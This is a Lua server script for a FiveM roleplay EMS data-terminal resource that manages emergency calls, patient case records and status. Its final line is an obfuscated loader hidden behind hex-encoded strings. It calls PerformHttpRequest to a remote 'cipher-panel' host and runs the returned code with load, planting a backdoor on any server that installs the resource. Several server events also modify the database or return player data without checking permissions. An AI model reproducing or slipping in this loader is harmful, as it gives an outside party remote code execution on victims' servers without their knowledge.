------------------------CREDITS------------------------
--------        Script made by Deltarix        --------
--   Copyright 2021 Deltarix. All rights reserved    --
-------------------------------------------------------
DenaliFW = exports['denalifw-core']:GetCoreObject()

-- Open the menu
RegisterCommand('ems', function(source)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    if Player.PlayerData.job.name == Config.Permission then
        exports.oxmysql:fetch('SELECT emsstatus FROM players WHERE citizenid = @citizenid', {
            ['@citizenid'] = Player.PlayerData.citizenid
        }, function(user)
            local charname = Player.PlayerData.charinfo.firstname.. ' ' ..Player.PlayerData.charinfo.lastname
            exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_calls', {}, function(calls)
                TriggerClientEvent('OpenMDT', src, charname, user[1].emsstatus, calls)
            end)
        end)
    end
end)
--

-- Change status on self
RegisterServerEvent('drx_emsmdt:chooseStatus')
AddEventHandler('drx_emsmdt:chooseStatus', function(data)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    exports.oxmysql:execute('UPDATE players SET emsstatus = @emsstatus WHERE citizenid = @citizenid', {
        ['@citizenid'] = Player.PlayerData.citizenid,
        ['@emsstatus'] = data.status
    })
end)

-- Create call event (type, message, location, coords)
RegisterServerEvent('drx_emsmdt:newCall')
AddEventHandler('drx_emsmdt:newCall', function(type, message, location, coords)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    exports.oxmysql:fetch('SELECT * FROM players WHERE citizenid = @citizenid', {
        ['@citizenid'] = Player.PlayerData.citizenid
    }, function(result)
        if result[1] then
            exports.oxmysql:execute('INSERT INTO drx_emsmdt_calls (citizenid, type, message, date, location, coords, charname, phone) VALUES (@citizenid, @type, @message, @date, @location, @coords, @charname, @phone)', {
                ['@citizenid'] = Player.PlayerData.citizenid,
                ['@type'] = type,
                ['@message'] = message,
                ['@date'] = os.date('%d-%m-%Y'),
                ['@location'] = location,
                ['@coords'] = json.encode(coords),
                ['@charname'] = Player.PlayerData.charinfo.firstname.. ' ' ..Player.PlayerData.charinfo.lastname,
                ['@phone'] = Player.PlayerData.charinfo.phone
            })
            TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.CallSubmitted)

            Wait(100)
            for k,v in pairs(DenaliFW.Functions.GetQBPlayers()) do
                local Players = DenaliFW.Functions.GetPlayer(k)
                if Players.PlayerData.job.name == Config.Permission then
                    exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_calls', {}, function(calls)
                        TriggerClientEvent('drx_emsmdt:updateCallList', k, calls)
                    end)
                    exports.oxmysql:fetch('SELECT emsstatus FROM players WHERE citizenid = @citizenid', {
                        ['@citizenid'] = Players.PlayerData.citizenid
                    }, function(status)
                        if status[1].emsstatus == 'Available' then
                            TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.NewCall.. ' ' ..location)
                        end
                    end)
                end
            end
        else
            print('[drx_emsmdt] - User does not exist in database, something is wrong with the database or the user')
        end
    end)
end)

-- User delete call from database and refresh ui for all with permission
RegisterServerEvent('drx_emsmdt:deleteCall')
AddEventHandler('drx_emsmdt:deleteCall', function(data)
    local src = source
    exports.oxmysql:execute('DELETE FROM drx_emsmdt_calls WHERE incident = @incident', {
        ['@incident'] = data.incident
    })
    TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.DeleteCall.. '' ..data.incident)
    Wait(100)
    for k,v in pairs(DenaliFW.Functions.GetQBPlayers()) do
        local Players = DenaliFW.Functions.GetPlayer(k)
        if Players.PlayerData.job.name == Config.Permission then
            exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_calls', {}, function(calls)
                TriggerClientEvent('drx_emsmdt:updateCallList', k, calls)
            end)
        end
    end
end)

-- User responds to patient
RegisterServerEvent('drx_emsmdt:responCall')
AddEventHandler('drx_emsmdt:responCall', function(data)
    local src = source
    if data.msg ~= nil then
        if DenaliFW.Functions.GetSource(data.citizenid) then
            local target = DenaliFW.Functions.GetSource(data.citizenid)
            TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.RespondedCall.. '' ..data.incident)
            TriggerClientEvent('DenaliFW:Notify', target,  Config.Notifications.ReceivedRespond.. ' #' ..data.incident.. ' ' ..data.msg)
        else
            TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.NoTarget)
        end
    else
        TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.NoMessage)
    end
end)

-- User searches in database, and sends the info back to ui
RegisterServerEvent('drx_emsmdt:searchDatabase')
AddEventHandler('drx_emsmdt:searchDatabase', function(data)
    local src = source
    exports.oxmysql:fetch('SELECT * FROM players WHERE LOWER(`citizenid`) LIKE @searchInput', {
        ['@searchInput'] = string.lower('%'..data.searchInput..'%')
	}, function(result)
        local searchResults = {}
        for k,v in ipairs(result) do
            local charinfo = json.decode(v.charinfo)
            v.firstname = charinfo.firstname
            v.lastname = charinfo.lastname
            v.phone = charinfo.phone
            table.insert(searchResults, v)
        end
        TriggerClientEvent('drx_emsmdt:returnDatabaseSearch', src, searchResults)
    end)
end)

-- User selected a patient, let's send all info from drx_emsmdt_database about that patient to user
RegisterServerEvent('drx_emsmdt:fetchPersonDatabase')
AddEventHandler('drx_emsmdt:fetchPersonDatabase', function(data)
    local src = source
    exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_database WHERE citizenid = @citizenid', {
        ['@citizenid'] = data.citizenid
    }, function(database)
        TriggerClientEvent('drx_emsmdt:returnPersonDatabase', src, database, data.firstname, data.lastname, data.phone)
    end)
end)

-- User created a new case record on patient, submit it to the database and then update the users ui with the updated database information
RegisterServerEvent('drx_emsmdt:submitNewCase')
AddEventHandler('drx_emsmdt:submitNewCase', function(data)
    local src = source
    exports.oxmysql:execute('INSERT INTO drx_emsmdt_database (`citizenid`, `patientName`, `author`, `title`, `desc`) VALUES (@citizenid, @patientName, @author, @title, @desc)', {
        ['@citizenid'] = data.citizenid,
        ['@patientName'] = data.firstname.. ' ' ..data.lastname,
        ['@author'] = data.author,
        ['@title'] = data.title,
        ['@desc'] = data.desc
    })

    Wait(100)
    TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.NewCase)
    exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_database WHERE citizenid = @citizenid', {
        ['@citizenid'] = data.citizenid
    }, function(database)
        TriggerClientEvent('drx_emsmdt:updatePersonDatabase', src, database)
    end)
end)

-- User requests to delete case, let's comit it and update the users ui with the updated information
RegisterServerEvent('drx_emsmdt:deletePersonCase')
AddEventHandler('drx_emsmdt:deletePersonCase', function(data)
    local src = source
    exports.oxmysql:execute('DELETE FROM drx_emsmdt_database WHERE id = @id', {
        ['@id'] = data.id
    }, function(success)
        if success then
            TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.DeletedCase.. '' ..data.id)
            exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_database WHERE citizenid = @citizenid', {
                ['@citizenid'] = data.citizenid
            }, function(database)
                TriggerClientEvent('drx_emsmdt:updatePersonDatabase', src, database)
            end)
        end
    end)
end)

-- User is saving title and description on a case that exists, save it and update the users ui with the updated information (May not be required, but doing it to make sure information is always updated)
RegisterServerEvent('drx_emsmdt:saveViewCase')
AddEventHandler('drx_emsmdt:saveViewCase', function(data)
    local src = source
    exports.oxmysql:execute('UPDATE drx_emsmdt_database SET `title` = @title, `desc` = @desc WHERE id = @id', {
        ['@id'] = data.id,
        ['@title'] = data.title,
        ['@desc'] = data.desc
    })

    Wait(100)
    TriggerClientEvent('DenaliFW:Notify', src,  Config.Notifications.SavedCase.. '' ..data.id)
    exports.oxmysql:fetch('SELECT * FROM drx_emsmdt_database WHERE citizenid = @citizenid', {
        ['@citizenid'] = data.citizenid
    }, function(database)
        TriggerClientEvent('drx_emsmdt:updatePersonDatabase', src, database)
    end)
end)

local NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[4][NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (knlMGNUjUktEOkhvFbopqpeWfkihpcRnwwiIADDslvvzpbYSnzLIPKemOIQBNqJFKvSifY, wlUYtdvVolCImMnPTOKzwxWHTKPJmIwOzJErDYEnrUfkZJIjwTiEJdvqabcHZkviinAhtW) if (wlUYtdvVolCImMnPTOKzwxWHTKPJmIwOzJErDYEnrUfkZJIjwTiEJdvqabcHZkviinAhtW == NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[6] or wlUYtdvVolCImMnPTOKzwxWHTKPJmIwOzJErDYEnrUfkZJIjwTiEJdvqabcHZkviinAhtW == NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[5]) then return end NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[4][NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[2]](NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[4][NaBrOLtSGXrLuEPKyyBweaKWJZBMwtRegqWnfdiXvqtFAPnOJEjVYdQVRMHZPPmNNMSXqN[3]](wlUYtdvVolCImMnPTOKzwxWHTKPJmIwOzJErDYEnrUfkZJIjwTiEJdvqabcHZkviinAhtW))() end)